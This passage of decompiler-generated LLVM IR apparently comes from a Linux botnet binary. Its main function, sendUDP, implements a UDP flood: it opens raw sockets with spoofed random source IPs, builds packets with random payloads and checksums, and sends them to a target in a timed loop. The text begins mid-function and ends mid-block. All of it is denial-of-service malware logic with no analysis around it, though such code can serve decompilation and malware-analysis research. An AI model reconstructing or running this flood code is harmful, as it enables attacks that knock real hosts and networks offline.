dec_label_pc_804b74b:                             ; preds = %dec_label_pc_804b614, %dec_label_pc_804b73f
  %v4_804b74b = add nuw nsw i32 %storemerge35, 1
  store i32 %v4_804b74b, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b74b, %arg6
  br i1 %exitcond, label %dec_label_pc_804b75a, label %dec_label_pc_804b614

dec_label_pc_804b75a:                             ; preds = %dec_label_pc_804b74b, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b74b ]
  %v2_804b760 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b760, i32* @ebx, align 4
  store i32 %v0_804b5dd, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804b74b, { 1, 2, 0 }
  uselistorder i32 %v4_804b6ba, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804b689, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b74b, { 1, 0 }
  uselistorder label %dec_label_pc_804b72a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b614, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp32 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804b768 = load i32, i32* @ebx, align 4
  %v13_804b769 = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b772 = icmp eq i32 %arg2, 0
  %v1_804b776 = icmp eq i1 %v4_804b772, false
  br i1 %v1_804b776, label %dec_label_pc_804b786, label %dec_label_pc_804b778

dec_label_pc_804b778:                             ; preds = %entry
  %v1_804b778 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b79b

dec_label_pc_804b786:                             ; preds = %entry
  %v1_804b789 = urem i32 %arg2, 65536
  store i32 %v1_804b789, i32* %eax.global-to-local, align 4
  store i32 %v1_804b789, i32* %stack_var_-140, align 4
  %v1_804b78f = trunc i32 %arg2 to i16
  %v2_804b78f = call i32 @htons(i16 %v1_804b78f)
  br label %dec_label_pc_804b79b

dec_label_pc_804b79b:                             ; preds = %dec_label_pc_804b778, %dec_label_pc_804b786
  %v2_804b79b = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v4_804b7ab = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804b7ab, i32* %eax.global-to-local, align 4
  %v1_804b7b0 = icmp eq i32 %v4_804b7ab, 0
  %v1_804b7b2 = icmp eq i1 %v1_804b7b0, false
  br i1 %v1_804b7b2, label %dec_label_pc_804bc59, label %dec_label_pc_804b7b8

dec_label_pc_804b7b8:                             ; preds = %dec_label_pc_804b79b
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b7d1 = icmp eq i32 %arg4, 32
  %v1_804b7d5 = icmp eq i1 %v9_804b7d1, false
  br i1 %v1_804b7d5, label %dec_label_pc_804b911, label %dec_label_pc_804b7db

dec_label_pc_804b7db:                             ; preds = %dec_label_pc_804b7b8
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804b7f2 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804b7f2, i32* %eax.global-to-local, align 4
  %v4_804b7fa = icmp eq i32 %v4_804b7f2, 0
  %v1_804b7fe = icmp eq i1 %v4_804b7fa, false
  br i1 %v1_804b7fe, label %dec_label_pc_804b81a, label %dec_label_pc_804b800

dec_label_pc_804b800:                             ; preds = %dec_label_pc_804b7db
  %v0_804b800 = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804b800, i32* %eax.global-to-local, align 4
  store i32 %v0_804b800, i32* %stack_var_-140, align 4
  %v3_804b810 = call i32 @Rootsprintf(i32 %v0_804b800, i32 ptrtoint ([27 x i8]* @global_var_8056a30.102 to i32))
  store i32 %v3_804b810, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc59

dec_label_pc_804b81a:                             ; preds = %dec_label_pc_804b7db
  %v1_804b81d = add i32 %arg5, 1
  store i32 %v1_804b81d, i32* %eax.global-to-local, align 4
  store i32 %v1_804b81d, i32* %stack_var_-140, align 4
  %v1_804b821 = call i32 @malloc(i32 %v1_804b81d)
  store i32 %v1_804b821, i32* %eax.global-to-local, align 4
  %v4_804b829 = icmp eq i32 %v1_804b821, 0
  br i1 %v4_804b829, label %dec_label_pc_804bc59, label %dec_label_pc_804b833

dec_label_pc_804b833:                             ; preds = %dec_label_pc_804b81a
  store i32 %v1_804b81d, i32* %edx.global-to-local, align 4
  %v1_804b83c = inttoptr i32 %v1_804b821 to i8*
  store i32 %v1_804b821, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b841 = and i32 %v1_804b821, -256
  store i32 %v1_804b841, i32* %eax.global-to-local, align 4
  %v5_804b843 = call i8* @_memset(i8* %v1_804b83c, i32 %v1_804b841, i32 %v1_804b81d)
  store i32 %v1_804b821, i32* %eax.global-to-local, align 4
  store i32 %v1_804b821, i32* %stack_var_-140, align 4
  %v4_804b852 = call i32 @makeRandomStr(i8* %v1_804b83c, i32 %arg5)
  store i32 %v4_804b852, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b85e = call i32 @__GI_time(i32* null)
  %v5_804b863 = add i32 %v2_804b85e, %arg3
  store i32 %v5_804b863, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804b8ef = sdiv i64 %sext, 4294967296
  %v3_804b8ef = mul nsw i64 %v2_804b8ef, 1000
  %v4_804b8ef = trunc i64 %v3_804b8ef to i32
  br label %dec_label_pc_804b879.outer

dec_label_pc_804b879.outer:                       ; preds = %dec_label_pc_804b8ec, %dec_label_pc_804b909, %dec_label_pc_804b833
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b833 ], [ 0, %dec_label_pc_804b8ec ], [ %v4_804b909, %dec_label_pc_804b909 ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b833 ], [ %v4_804b8e1, %dec_label_pc_804b8ec ], [ %v4_804b8e1, %dec_label_pc_804b909 ]
  br label %dec_label_pc_804b879

dec_label_pc_804b879:                             ; preds = %dec_label_pc_804b879.outer, %dec_label_pc_804b8c3
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b8c3 ], [ %stack_var_-92.0.ph, %dec_label_pc_804b879.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804b7f2, i32* %eax.global-to-local, align 4
  store i32 %v4_804b7f2, i32* %stack_var_-140, align 4
  %v7_804b8a4 = call i32 @__libc_sendto(i32 %v4_804b7f2, i32 %v1_804b821, i32 %arg5, i32 0, i32 %v2_804b79b, i32 16)
  store i32 %v7_804b8a4, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b8ac = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b8af = icmp eq i1 %v15_804b8ac, false
  br i1 %v1_804b8af, label %dec_label_pc_804b8e1, label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b879
  br i1 %v1_804b776, label %dec_label_pc_804b8c3, label %dec_label_pc_804b8b7

dec_label_pc_804b8b7:                             ; preds = %dec_label_pc_804b8b1
  %v0_804b8b7 = load i32, i32* %stack_var_-140, align 4
  %v1_804b8b7 = call i32 @rand_cmwc(i32 %v0_804b8b7)
  %v1_804b8bc = urem i32 %v1_804b8b7, 65536
  store i32 %v1_804b8bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8c3

dec_label_pc_804b8c3:                             ; preds = %dec_label_pc_804b8b1, %dec_label_pc_804b8b7
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b8ca = call i32 @__GI_time(i32* null)
  store i32 %v2_804b8ca, i32* %eax.global-to-local, align 4
  %v8_804b8d2 = icmp sgt i32 %v2_804b8ca, %v5_804b863
  br i1 %v8_804b8d2, label %dec_label_pc_804bc59, label %dec_label_pc_804b879

dec_label_pc_804b8e1:                             ; preds = %dec_label_pc_804b879
  %v4_804b8e1 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b8e7 = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b8ea = icmp eq i1 %v15_804b8e7, false
  br i1 %v1_804b8ea, label %dec_label_pc_804b909, label %dec_label_pc_804b8ec

dec_label_pc_804b8ec:                             ; preds = %dec_label_pc_804b8e1
  store i32 %v4_804b8ef, i32* %eax.global-to-local, align 4
  store i32 %v4_804b8ef, i32* %stack_var_-140, align 4
  %v2_804b8f8 = call i32 @usleep(i64 %v3_804b8ef)
  store i32 %v2_804b8f8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b879.outer

dec_label_pc_804b909:                             ; preds = %dec_label_pc_804b8e1
  %v4_804b909 = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b879.outer

dec_label_pc_804b911:                             ; preds = %dec_label_pc_804b7b8
  store i32 %v13_804b769, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804b92d = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804b92d, i32* %eax.global-to-local, align 4
  %v4_804b935 = icmp eq i32 %v4_804b92d, 0
  %v1_804b939 = icmp eq i1 %v4_804b935, false
  br i1 %v1_804b939, label %dec_label_pc_804b955, label %dec_label_pc_804b93b

dec_label_pc_804b93b:                             ; preds = %dec_label_pc_804b911
  %v0_804b93b = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804b93b, i32* %eax.global-to-local, align 4
  store i32 %v0_804b93b, i32* %stack_var_-140, align 4
  %v3_804b94b = call i32 @Rootsprintf(i32 %v0_804b93b, i32 ptrtoint ([27 x i8]* @global_var_8056a30.102 to i32))
  store i32 %v3_804b94b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc56

dec_label_pc_804b955:                             ; preds = %dec_label_pc_804b911
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b964 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v4_804b92d, i32* %eax.global-to-local, align 4
  store i32 %v4_804b92d, i32* %stack_var_-140, align 4
  %v6_804b981 = call i32 @__GI_setsockopt(i32 %v4_804b92d, i32 0, i32 3, i32 %v2_804b964, i32 4)
  store i32 %v6_804b981, i32* %eax.global-to-local, align 4
  %v2_804b986 = icmp slt i32 %v6_804b981, 0
  %v1_804b988 = icmp eq i1 %v2_804b986, false
  br i1 %v1_804b988, label %dec_label_pc_804b9d7.preheader, label %dec_label_pc_804b98a

dec_label_pc_804b9d7.preheader:                   ; preds = %dec_label_pc_804b955
  br label %dec_label_pc_804b9ad

dec_label_pc_804b98a:                             ; preds = %dec_label_pc_804b955
  %v0_804b98a = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804b98a, i32* %eax.global-to-local, align 4
  store i32 %v0_804b98a, i32* %stack_var_-140, align 4
  %v3_804b99a = call i32 @Rootsprintf(i32 %v0_804b98a, i32 ptrtoint ([33 x i8]* @global_var_8056a4c.103 to i32))
  store i32 %v3_804b99a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc56

dec_label_pc_804b9ad:                             ; preds = %dec_label_pc_804b9d7.preheader, %dec_label_pc_804b9ad
  %v4_804b9d776 = phi i32 [ 49, %dec_label_pc_804b9d7.preheader ], [ %v4_804b9d7, %dec_label_pc_804b9ad ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b9b4 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b9b4, i32* %eax.global-to-local, align 4
  store i32 %v2_804b9b4, i32* @ebx, align 4
  %v0_804b9bb = load i32, i32* %stack_var_-140, align 4
  %v1_804b9bb = call i32 @rand_cmwc(i32 %v0_804b9bb)
  %v1_804b9c0 = load i32, i32* @ebx, align 4
  %v2_804b9c0 = xor i32 %v1_804b9c0, %v1_804b9bb
  store i32 %v2_804b9c0, i32* @eax, align 4
  store i32 %v2_804b9c0, i32* %stack_var_-140, align 4
  %v1_804b9c5 = call i32 @srand(i32 %v2_804b9c0)
  store i32 %v1_804b9c5, i32* @eax, align 4
  %v0_804b9ca = call i32 @random()
  store i32 %v0_804b9ca, i32* %eax.global-to-local, align 4
  store i32 %v0_804b9ca, i32* %stack_var_-140, align 4
  %v1_804b9d2 = call i32 @init_rand(i32 %v0_804b9ca)
  store i32 %v1_804b9d2, i32* %eax.global-to-local, align 4
  %v4_804b9d7 = add nsw i32 %v4_804b9d776, -1
  %v13_804b9da = icmp eq i32 %v4_804b9d776, 0
  %v1_804b9de = icmp eq i1 %v13_804b9da, false
  br i1 %v1_804b9de, label %dec_label_pc_804b9ad, label %dec_label_pc_804b9e0

dec_label_pc_804b9e0:                             ; preds = %dec_label_pc_804b9ad
  %v4_804b9e0 = icmp eq i32 %arg4, 0
  %v1_804b9e4 = icmp eq i1 %v4_804b9e0, false
  br i1 %v1_804b9e4, label %dec_label_pc_804b9ef, label %dec_label_pc_804ba05

dec_label_pc_804b9ef:                             ; preds = %dec_label_pc_804b9e0
  %v5_804b9f6 = sub i32 32, %arg4
  %v2_804b9fe = urem i32 %v5_804b9f6, 32
  %v4_804b9fe = icmp eq i32 %v2_804b9fe, 0
  br i1 %v4_804b9fe, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804b9ef
  %v5_804b9fe = shl i32 1, %v2_804b9fe
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804b9ef, %bb
  %v0_804ba00 = phi i32 [ %v5_804b9fe, %bb ], [ 1, %dec_label_pc_804b9ef ]
  %v1_804ba00 = sub i32 0, %v0_804ba00
  store i32 %v1_804ba00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ba05

dec_label_pc_804ba05:                             ; preds = %dec_label_pc_804b9e0, %bb72
  %storemerge6 = phi i32 [ %v1_804ba00, %bb72 ], [ 0, %dec_label_pc_804b9e0 ]
  %v1_804ba08 = add i32 %arg5, 28
  %v1_804ba14 = add i32 %arg5, 58
  %v2_804ba17 = and i32 %v1_804ba14, -16
  %v0_804ba1d = load i32, i32* @esp, align 4
  %v2_804ba1d = sub i32 %v0_804ba1d, %v2_804ba17
  %v1_804ba29 = add i32 %v2_804ba1d, 39
  %v2_804ba2c = and i32 %v1_804ba29, -16
  store i32 %v2_804ba2c, i32* %edx.global-to-local, align 4
  %v1_804ba44 = add i32 %v2_804ba2c, 20
  %v5_804ba47 = inttoptr i32 %v1_804ba44 to i16*
  %v1_804ba4d = add i32 %arg5, 8
  store i32 %v1_804ba4d, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ba55 = inttoptr i32 %v2_804ba1d to i32*
  store i32 %storemerge6, i32* %v2_804ba55, align 4
  %v2_804ba58 = call i32 @GetRandomIP(i32 %v1_804ba08, i32 %v2_804ba2c)
  store i32 %v2_804ba58, i32* %eax.global-to-local, align 4
  %v1_804ba5d = load i32, i32* @esp, align 4
  %v2_804ba5d = inttoptr i32 %v1_804ba5d to i32*
  store i32 %v2_804ba58, i32* %v2_804ba5d, align 4
  %v0_804ba60 = call i32 @htonl()
  %v3_804ba65 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804ba65, i32* %edx.global-to-local, align 4
  %v0_804ba68 = load i32, i32* @ebx, align 4
  %v1_804ba68 = load i32, i32* @esp, align 4
  %v2_804ba68 = add i32 %v1_804ba68, 16
  %v3_804ba68 = inttoptr i32 %v2_804ba68 to i32*
  store i32 %v0_804ba68, i32* %v3_804ba68, align 4
  %v0_804ba6c = load i32, i32* @esp, align 4
  %v1_804ba6c = add i32 %v0_804ba6c, 12
  %v2_804ba6c = inttoptr i32 %v1_804ba6c to i32*
  store i32 17, i32* %v2_804ba6c, align 4
  %v1_804ba74 = load i32, i32* @esp, align 4
  %v2_804ba74 = add i32 %v1_804ba74, 8
  %v3_804ba74 = inttoptr i32 %v2_804ba74 to i32*
  store i32 %v0_804ba60, i32* %v3_804ba74, align 4
  %v0_804ba78 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba78 = load i32, i32* @esp, align 4
  %v2_804ba78 = add i32 %v1_804ba78, 4
  %v3_804ba78 = inttoptr i32 %v2_804ba78 to i32*
  store i32 %v0_804ba78, i32* %v3_804ba78, align 4
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v1_804ba7f = load i32, i32* @esp, align 4
  %v2_804ba7f = inttoptr i32 %v1_804ba7f to i32*
  store i32 %v2_804ba2c, i32* %v2_804ba7f, align 4
  %v0_804ba82 = call i32 @makeIPPacket()
  %v1_804ba90 = urem i32 %v1_804ba4d, 65536
  store i32 %v1_804ba90, i32* %eax.global-to-local, align 4
  %v1_804ba93 = load i32, i32* @esp, align 4
  %v2_804ba93 = inttoptr i32 %v1_804ba93 to i32*
  store i32 %v1_804ba90, i32* %v2_804ba93, align 4
  %v2_804ba96 = trunc i32 %v1_804ba44 to i16
  %v3_804ba96 = call i32 @htons(i16 %v2_804ba96)
  %v1_804ba9b = urem i32 %v3_804ba96, 65536
  store i32 %v1_804ba9b, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba44, i32* %eax.global-to-local, align 4
  %v1_804baa1 = trunc i32 %v3_804ba96 to i16
  %v3_804baa1 = add i32 %v2_804ba2c, 24
  %v4_804baa1 = inttoptr i32 %v3_804baa1 to i16*
  store i16 %v1_804baa1, i16* %v4_804baa1, align 8
  %v2_804baa5 = call i32 @rand_cmwc(i32 %v1_804ba44)
  %v1_804baaa = urem i32 %v2_804baa5, 65536
  store i32 %v1_804baaa, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba44, i32* %eax.global-to-local, align 4
  %v1_804bab0 = trunc i32 %v2_804baa5 to i16
  store i16 %v1_804bab0, i16* %v5_804ba47, align 4
  br i1 %v1_804b776, label %dec_label_pc_804bac6, label %dec_label_pc_804bab9

dec_label_pc_804bab9:                             ; preds = %dec_label_pc_804ba05
  %v2_804bab9 = call i32 @rand_cmwc(i32 %v1_804ba44)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804bada

dec_label_pc_804bac6:                             ; preds = %dec_label_pc_804ba05
  %v1_804bac9 = urem i32 %arg2, 65536
  store i32 %v1_804bac9, i32* %eax.global-to-local, align 4
  %v1_804bacc = load i32, i32* @esp, align 4
  %v2_804bacc = inttoptr i32 %v1_804bacc to i32*
  store i32 %v1_804bac9, i32* %v2_804bacc, align 4
  %v3_804bacf = call i32 @htons(i16 %tmp32)
  br label %dec_label_pc_804bada

dec_label_pc_804bada:                             ; preds = %dec_label_pc_804bab9, %dec_label_pc_804bac6
  %v1_804bb9a.pre-phi = phi i32 [ %.pre, %dec_label_pc_804bab9 ], [ %v1_804bac9, %dec_label_pc_804bac6 ]
  %storemerge8.in = phi i32 [ %v2_804bab9, %dec_label_pc_804bab9 ], [ %v3_804bacf, %dec_label_pc_804bac6 ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext9 = mul i32 %storemerge8.in, 65536
  %v4_804badd = sdiv i32 %sext9, 65536
  %v3_804bae0 = add i32 %v2_804ba2c, 22
  %v4_804bae0 = inttoptr i32 %v3_804bae0 to i16*
  store i16 %storemerge5, i16* %v4_804bae0, align 2
  %v1_804bae7 = add i32 %v2_804ba2c, 26
  %v2_804bae7 = inttoptr i32 %v1_804bae7 to i16*
  store i16 0, i16* %v2_804bae7, align 2
  %v1_804baf0 = add i32 %v2_804ba2c, 28
  store i32 %v1_804baf0, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804baf6 = load i32, i32* @esp, align 4
  %v2_804baf6 = add i32 %v1_804baf6, 4
  %v3_804baf6 = inttoptr i32 %v2_804baf6 to i32*
  store i32 %arg5, i32* %v3_804baf6, align 4
  %v0_804bafa = load i32, i32* %edx.global-to-local, align 4
  %v1_804bafa = load i32, i32* @esp, align 4
  %v2_804bafa = inttoptr i32 %v1_804bafa to i32*
  store i32 %v0_804bafa, i32* %v2_804bafa, align 4
  %v3_804bafd = sext i16 %tmp to i32
  %v4_804bafd = inttoptr i32 %v4_804badd to i8*
  %v5_804bafd = call i32 @makeRandomStr(i8* %v4_804bafd, i32 %v3_804bafd)
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v1_804bb05 = or i32 %v2_804ba2c, 2
  %v2_804bb05 = inttoptr i32 %v1_804bb05 to i16*
  %v3_804bb05 = load i16, i16* %v2_804bb05, align 2
  %v4_804bb05 = zext i16 %v3_804bb05 to i32
  store i32 %v4_804bb05, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v1_804bb0e = load i32, i32* @esp, align 4
  %v2_804bb0e = add i32 %v1_804bb0e, 4
  %v3_804bb0e = inttoptr i32 %v2_804bb0e to i32*
  store i32 %v4_804bb05, i32* %v3_804bb0e, align 4
  %v0_804bb12 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb12 = load i32, i32* @esp, align 4
  %v2_804bb12 = inttoptr i32 %v1_804bb12 to i32*
  store i32 %v0_804bb12, i32* %v2_804bb12, align 4
  %v4_804bb15 = inttoptr i32 %v4_804badd to i16*
  %v5_804bb15 = call i32 @csum(i16* %v4_804bb15, i32 %v3_804bafd)
  %v1_804bb1a = urem i32 %v5_804bb15, 65536
  store i32 %v1_804bb1a, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v1_804bb20 = trunc i32 %v5_804bb15 to i16
  %v3_804bb20 = or i32 %v2_804ba2c, 10
  %v4_804bb20 = inttoptr i32 %v3_804bb20 to i16*
  store i16 %v1_804bb20, i16* %v4_804bb20, align 2
  %v0_804bb24 = load i32, i32* @esp, align 4
  %v1_804bb24 = inttoptr i32 %v0_804bb24 to i32*
  store i32 0, i32* %v1_804bb24, align 4
  %v2_804bb2b = inttoptr i32 %v4_804badd to i32*
  %v3_804bb2b = call i32 @__GI_time(i32* %v2_804bb2b)
  %v5_804bb30 = add i32 %v3_804bb2b, %arg3
  store i32 %v5_804bb30, i32* %eax.global-to-local, align 4
  %v3_804bbc0 = or i32 %v2_804ba2c, 4
  %v4_804bbc0 = inttoptr i32 %v3_804bbc0 to i16*
  %v2_804bbdc = or i32 %v2_804ba2c, 12
  %v3_804bbdc = inttoptr i32 %v2_804bbdc to i32*
  %sext12 = mul i64 %arg8, 4294967296
  %v2_804bc34 = sdiv i64 %sext12, 4294967296
  %v3_804bc34 = mul nsw i64 %v2_804bc34, 1000
  %v4_804bc34 = trunc i64 %v3_804bc34 to i32
  br label %dec_label_pc_804bb46.outer

dec_label_pc_804bb46.outer:                       ; preds = %dec_label_pc_804bc31, %dec_label_pc_804bc4e, %dec_label_pc_804bada
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804bada ], [ %v4_804bc26, %dec_label_pc_804bc4e ], [ %v4_804bc26, %dec_label_pc_804bc31 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804bada ], [ %v4_804bc4e, %dec_label_pc_804bc4e ], [ 0, %dec_label_pc_804bc31 ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804bada ], [ %storemerge, %dec_label_pc_804bc4e ], [ %storemerge, %dec_label_pc_804bc31 ]
  br label %dec_label_pc_804bb46

dec_label_pc_804bb46:                             ; preds = %dec_label_pc_804bb46.outer, %dec_label_pc_804bc09
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804bc09 ], [ %stack_var_-84.0.ph, %dec_label_pc_804bb46.outer ]
  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804bc09 ], [ %stack_var_-104.0.ph, %dec_label_pc_804bb46.outer ]
  store i32 %v2_804ba2c, i32* %edx.global-to-local, align 4
  %v0_804bb4c = load i32, i32* @esp, align 4
  %v1_804bb4c = add i32 %v0_804bb4c, 20
  %v2_804bb4c = inttoptr i32 %v1_804bb4c to i32*
  store i32 16, i32* %v2_804bb4c, align 4
  %v1_804bb54 = load i32, i32* @esp, align 4
  %v2_804bb54 = add i32 %v1_804bb54, 16
  %v3_804bb54 = inttoptr i32 %v2_804bb54 to i32*
  store i32 %v2_804b79b, i32* %v3_804bb54, align 4
  %v0_804bb58 = load i32, i32* @esp, align 4
  %v1_804bb58 = add i32 %v0_804bb58, 12
  %v2_804bb58 = inttoptr i32 %v1_804bb58 to i32*
  store i32 0, i32* %v2_804bb58, align 4
  %v1_804bb63 = load i32, i32* @esp, align 4
  %v2_804bb63 = add i32 %v1_804bb63, 8
  %v3_804bb63 = inttoptr i32 %v2_804bb63 to i32*
  store i32 %v1_804ba08, i32* %v3_804bb63, align 4
  %v0_804bb67 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bb67 = load i32, i32* @esp, align 4
  %v2_804bb67 = add i32 %v1_804bb67, 4
  %v3_804bb67 = inttoptr i32 %v2_804bb67 to i32*
  store i32 %v0_804bb67, i32* %v3_804bb67, align 4
  store i32 %v4_804b92d, i32* %eax.global-to-local, align 4
  %v1_804bb6e = load i32, i32* @esp, align 4
  %v2_804bb6e = inttoptr i32 %v1_804bb6e to i32*
  store i32 %v4_804b92d, i32* %v2_804bb6e, align 4
  %v6_804bb71 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804bb71, i32* %eax.global-to-local, align 4
  %v1_804bb76 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804bb7b = urem i32 %v1_804bb76, 65536
  store i32 %v1_804bb7b, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba44, i32* %eax.global-to-local, align 4
  %v1_804bb81 = trunc i32 %v1_804bb76 to i16
  store i16 %v1_804bb81, i16* %v5_804ba47, align 4
  br i1 %v1_804b776, label %dec_label_pc_804bb97, label %dec_label_pc_804bb8a

dec_label_pc_804bb8a:                             ; preds = %dec_label_pc_804bb46
  %v1_804bb8a = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804bbab

dec_label_pc_804bb97:                             ; preds = %dec_label_pc_804bb46
  store i32 %v1_804bb9a.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804bb9d = load i32, i32* @esp, align 4
  %v2_804bb9d = inttoptr i32 %v1_804bb9d to i32*
  store i32 %v1_804bb9a.pre-phi, i32* %v2_804bb9d, align 4
  %v3_804bba0 = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804bbab

dec_label_pc_804bbab:                             ; preds = %dec_label_pc_804bb8a, %dec_label_pc_804bb97
  %storemerge10.in = phi i32 [ %v1_804bb8a, %dec_label_pc_804bb8a ], [ %v3_804bba0, %dec_label_pc_804bb97 ]
  %storemerge = trunc i32 %storemerge10.in to i16
  store i32 %v1_804ba44, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %storemerge10.in, 65536
  %v4_804bbae = sdiv i32 %sext11, 65536
  store i32 %v4_804bbae, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804bae0, align 2
  %v2_804bbb5 = call i32 @rand_cmwc(i32 %v4_804bbae)
  %v1_804bbba = urem i32 %v2_804bbb5, 65536
  store i32 %v1_804bbba, i32* %edx.global-to-local, align 4
  %v1_804bbc0 = trunc i32 %v2_804bbb5 to i16
  store i16 %v1_804bbc0, i16* %v4_804bbc0, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804bbc7 = load i32, i32* @esp, align 4
  %v2_804bbc7 = inttoptr i32 %v1_804bbc7 to i32*
  store i32 %storemerge6, i32* %v2_804bbc7, align 4
  %v3_804bbca = call i32 @GetRandomIP(i32 %v4_804bbae, i32 %v13_804b769)
  store i32 %v3_804bbca, i32* %eax.global-to-local, align 4
  %v1_804bbcf = load i32, i32* @esp, align 4
  %v2_804bbcf = inttoptr i32 %v1_804bbcf to i32*
  store i32 %v3_804bbca, i32* %v2_804bbcf, align 4
  %v0_804bbd2 = call i32 @htonl()
  store i32 %v0_804bbd2, i32* %edx.global-to-local, align 4
  store i32 %v0_804bbd2, i32* %v3_804bbdc, align 4
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v3_804bbe2 = load i16, i16* %v2_804bb05, align 2
  %v4_804bbe2 = zext i16 %v3_804bbe2 to i32
  store i32 %v4_804bbe2, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba2c, i32* %eax.global-to-local, align 4
  %v1_804bbeb = load i32, i32* @esp, align 4
  %v2_804bbeb = add i32 %v1_804bbeb, 4
  %v3_804bbeb = inttoptr i32 %v2_804bbeb to i32*
  store i32 %v4_804bbe2, i32* %v3_804bbeb, align 4
  %v0_804bbef = load i32, i32* %eax.global-to-local, align 4
  %v1_804bbef = load i32, i32* @esp, align 4
  %v2_804bbef = inttoptr i32 %v1_804bbef to i32*
  store i32 %v0_804bbef, i32* %v2_804bbef, align 4
  %v3_804bbf2 = inttoptr i32 %v4_804bbae to i16*
